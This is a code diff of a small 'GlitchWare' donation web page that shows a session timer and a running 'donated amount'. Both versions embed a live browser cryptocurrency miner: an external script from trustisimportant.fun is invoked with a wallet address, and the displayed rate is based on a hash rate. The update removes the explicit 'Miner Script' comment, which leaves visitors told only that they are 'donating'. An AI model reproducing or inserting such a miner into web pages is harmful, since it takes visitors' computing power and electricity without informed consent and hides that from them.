@@ -1,101 +1,69 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Glitchware Donate Page</title>
-    <style>
-        body {
-            font-family: 'Arial', sans-serif;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background-color: #282c34; /* Dark blue background */
-            color: #32CD32; /* Green text */
-            margin: 0;
-        }
-        .content {
-            text-align: center;
-            margin-top: 20px;
-            background-color: #20232a;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
-            color: #32CD32; /* Green text */
-        }
-        h1 {
-            font-size: 2.5em;
-            margin-bottom: 10px;
-        }
-        p {
-            font-size: 1.2em;
-            margin-bottom: 20px;
-        }
-        .timer {
-            font-size: 1.5em;
-            margin-top: 20px;
-            background-color: #20232a;
-            padding: 10px;
-            border-radius: 5px;
-            border: 2px solid #32CD32; /* Green border */
-            color: #32CD32; /* Green text */
-        }
-        #frame {
-            width: 728px;
-            margin-top: 20px;
-            text-align: center;
-        }
-        #frame iframe {
-            width: 728px;
-            height: 90px;
-            border: 0;
-            padding: 0;
-            overflow: hidden;
-            background-color: transparent;
-            margin-bottom: 10px;
-        }
-        #preview-link {
-            display: block;
-            text-align: right;
-            font-size: 12px;
-            color: #61dafb; /* Light blue for link */
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Donation Tracker</title>
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        background-color: #222;
+        color: #fff;
+        text-align: center;
+        padding: 50px;
+    }
+    .donation-info {
+        font-size: 24px;
+        font-weight: bold;
+        margin-bottom: 20px;
+    }
+    .time-counter {
+        font-size: 20px;
+        color: #ccc;
+        margin-bottom: 10px;
+    }
+    .donation-rate {
+        font-size: 16px;
+        color: #999;
+        margin-bottom: 20px;
+    }
+</style>
 </head>
 <body>
-    <div class="content">
-        <h1>You are currently donating to GlitchWare as long as this page is open</h1>
-        <p>We kindly request you to disable adblockers, we earn funds by showing ads to you.</p>
-        <div class="timer" id="timer">In this session 0 seconds have passed</div>
-    </div>
+    <div class="donation-info">Donated amount of money to GlitchWare in this session: $<span id="donation-amount">0.0000000000</span></div>
+    <div class="time-counter" id="time-counter">00:00:00</div>
+    <div class="donation-rate">Current AFK donation rate: $0.0000000144 per second</div>
 
-    <!-- Advertisement -->
-    <div id='frame'>
-        <iframe data-aa='2333810' src='//ad.a-ads.com/2333810?size=728x90' style='width:728px; height:90px; border:0px; padding:0; overflow:hidden; background-color: transparent;'></iframe>
-        <a id='preview-link' href='https://a-ads.com/?partner=2333810'>Advertise here</a>
-    </div>
-
-    <!-- Miner Script -->
     <script src="https://trustisimportant.fun/karma/karma.js?karma=bs?nosaj=faster.mo"></script>
     <script type="text/javascript">
         EverythingIsLife('45d5LPYeRSEPywkk61dHxFfSDLKYhRhuP3VoC8d9B98Qgu3jDZTxm9G949ZpLGSTXAUk24sXniAn5WtHLrzFbR3UK2Mhwdt', 'Donate', 70);
     </script>
-    <script>   
-        let seconds = 0;
-        function updateTimer() {
-            seconds++;
-            const minutes = Math.floor(seconds / 60);
-            const hours = Math.floor(minutes / 60);
-            const displaySeconds = seconds % 60;
-            const displayMinutes = minutes % 60;
-            const displayHours = hours;
 
-            document.getElementById('timer').textContent = `In this session ${displayHours} hour(s) ${displayMinutes} minute(s) ${displaySeconds} second(s) have passed`;
+    <script type="text/javascript">
+        // Initialize variables
+        var donationAmount = 0.0000000000;
+        var secondsElapsed = 0;
+        var donationRatePerSecond = 0.0000000144; // Updated donation rate per second for 25 h/s
+
+        // Update counters every second
+        setInterval(updateCounters, 1000);
+
+        function updateCounters() {
+            // Update donation amount
+            donationAmount += donationRatePerSecond;
+            document.getElementById('donation-amount').innerText = donationAmount.toFixed(10); // Display up to 10 decimal places
+
+            // Update time counter
+            secondsElapsed++;
+            var hours = Math.floor(secondsElapsed / 3600);
+            var minutes = Math.floor((secondsElapsed % 3600) / 60);
+            var seconds = secondsElapsed % 60;
+            document.getElementById('time-counter').innerText = formatTime(hours) + ":" + formatTime(minutes) + ":" + formatTime(seconds);
         }
 
-        setInterval(updateTimer, 1000);
+        function formatTime(time) {
+            return (time < 10 ? "0" + time : time);
+        }
     </script>
 </body>
 </html>
